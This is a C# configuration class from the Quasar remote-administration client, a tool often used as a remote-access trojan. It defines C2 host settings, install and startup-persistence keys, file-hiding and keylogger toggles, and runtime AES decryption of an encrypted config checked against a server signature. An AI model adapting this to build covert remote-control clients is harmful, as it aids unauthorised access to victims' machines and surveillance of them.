using Quasar.Common.Cryptography;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Quasar.Client.Config
{
    /// <summary>
    /// Stores the configuration of the client.
    /// </summary>
    public static class Settings
    {
#if DEBUG
        public static string VERSION = "1.0.0";
        public static string HOSTS = "127.0.0.1:61875;";
        public static int RECONNECTDELAY = 500;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "Test";
        public static string INSTALLNAME = "test.exe";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "123AKs82kA,ylAo2kAlUS2kYkala!";
        public static string STARTUPKEY = "Quasar Client Startup";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "04EAF6A0101A978349F297F2A924F3095328238B";
        public static string TAG = "DEBUG";
        public static string LOGDIRECTORYNAME = "Logs";
        public static string SERVERSIGNATURE = "jV4UZStIme6Pn+uXi4nlu4QSvNZSe05stGmIdH3hq45L1EOvxDXrl9PrLI8tRgAXOjj2Cvwat+o2N+R3hJBauUP9a6HS4uG5M9/BUMZ96LsL5npSu78HX09QQkxyJHb+pT/lo/VlC0E5f9wM/G37+u6ckya8I3NqI6kblpGLZMTXF1GVIAGbKgsHGp+kOx0YE3tFvFxL6mLit8UyUqBKu1YhygJXzV21ixbCBtUJ4W0ehGLv2F0IYzATSXdiORhe9iLOFxDN/V3478vzlvko5WMj9iV/LjZqItA1LW5D+WzpVxOOCbmemraxTSK3e+pexCES9z4RtzB2+e+qIByvWrB6RG9bPobM/tDkIGPMsMpAK9KVWgkHbe1RxUtViSgEm5RSPHXtFCzyqnaf9BssBvBO/vxwqgVVCNhHtKMfUkC9Q2rrvDY7JwDRTAcKm/P1m1QykyQhMvA1e9O1qXFrE1fII/dUZyONMwKWw/bel9+nyysRhfXSm3G8jgt9BKAQ/uGzimzE0m31xUT/8t3HWuO62fTkFre7vAi6THh5aTAWnEdsWkVM/RRXbcRBKmr0UD8w12dE4O5yRO1G6MPPHgEkki1piB32mvE2Vw4y9l+3VhRrdJbiyk8I01K/yRlNnd6stdCy5aqax0af6Uz+WtCjv64N5j7AcDcUE961DyQ=";
        public static string SERVERCERTIFICATESTR = "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";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = true;

        public static bool Initialize()
        {
            SetupPaths();
            return true;
        }
#else
        public static string VERSION = "";
        public static string HOSTS = "";
        public static int RECONNECTDELAY = 5000;
        public static Environment.SpecialFolder SPECIALFOLDER = Environment.SpecialFolder.ApplicationData;
        public static string DIRECTORY = Environment.GetFolderPath(SPECIALFOLDER);
        public static string SUBDIRECTORY = "";
        public static string INSTALLNAME = "";
        public static bool INSTALL = false;
        public static bool STARTUP = false;
        public static string MUTEX = "";
        public static string STARTUPKEY = "";
        public static bool HIDEFILE = false;
        public static bool ENABLELOGGER = false;
        public static string ENCRYPTIONKEY = "";
        public static string TAG = "";
        public static string LOGDIRECTORYNAME = "";
        public static string SERVERSIGNATURE = "";
        public static string SERVERCERTIFICATESTR = "";
        public static X509Certificate2 SERVERCERTIFICATE;
        public static bool HIDELOGDIRECTORY = false;
        public static bool HIDEINSTALLSUBDIRECTORY = false;
        public static string INSTALLPATH = "";
        public static string LOGSPATH = "";
        public static bool UNATTENDEDMODE = true;

        public static bool Initialize()
        {
            if (string.IsNullOrEmpty(VERSION)) return false;
            var aes = new Aes256(ENCRYPTIONKEY);
            TAG = aes.Decrypt(TAG);
            VERSION = aes.Decrypt(VERSION);
            HOSTS = aes.Decrypt(HOSTS);
            SUBDIRECTORY = aes.Decrypt(SUBDIRECTORY);
            INSTALLNAME = aes.Decrypt(INSTALLNAME);
            MUTEX = aes.Decrypt(MUTEX);
            STARTUPKEY = aes.Decrypt(STARTUPKEY);
            LOGDIRECTORYNAME = aes.Decrypt(LOGDIRECTORYNAME);
            SERVERSIGNATURE = aes.Decrypt(SERVERSIGNATURE);
            SERVERCERTIFICATE = new X509Certificate2(Convert.FromBase64String(aes.Decrypt(SERVERCERTIFICATESTR)));
            SetupPaths();
            return VerifyHash();
        }
#endif

        static void SetupPaths()
        {
            LOGSPATH = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), LOGDIRECTORYNAME);
            INSTALLPATH = Path.Combine(DIRECTORY, (!string.IsNullOrEmpty(SUBDIRECTORY) ? SUBDIRECTORY + @"\" : "") + INSTALLNAME);
        }

        static bool VerifyHash()
        {
            try
            {
                var csp = (RSACryptoServiceProvider) SERVERCERTIFICATE.PublicKey.Key;
                return csp.VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(ENCRYPTIONKEY)), CryptoConfig.MapNameToOID("SHA256"),
                    Convert.FromBase64String(SERVERSIGNATURE));
                
            }
            catch (Exception)
            {
                return false;
            }
        }
    }
}
